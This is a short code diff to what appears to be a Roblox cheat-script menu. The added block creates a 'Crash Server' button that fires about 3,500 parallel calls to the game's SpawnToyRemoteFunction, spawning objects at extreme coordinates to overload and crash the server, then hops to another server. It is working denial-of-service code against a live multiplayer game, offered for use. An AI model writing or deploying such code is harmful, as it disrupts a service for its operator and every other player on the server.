@@ -655,4 +655,20 @@ FunTab:AddButton("Remove Coin Giver Cooldown", function()
 	end
 end)
 
+FunTab:AddButton("Crash Server", function()
+	local spawnrf = game.ReplicatedStorage.Menu.SpawnToyRemoteFunction
+	local args = {'Pallet', workspace.CurrentCamera.CFrame+Vector3.new(0, 1000000, 1000000), 0, 0, 0}
+
+	for i=0,3500 do
+		if i%50==0 then task.wait(0.1) print(math.floor(i/3500*100), "% done") end
+		task.spawn(function()
+			pcall(function()
+				spawnrf:InvokeServer(unpack(args))
+			end)
+		end)
+	end
+
+	print('finished, server hopping in 8 sec')
+end)
+
 Menu:Finalize()
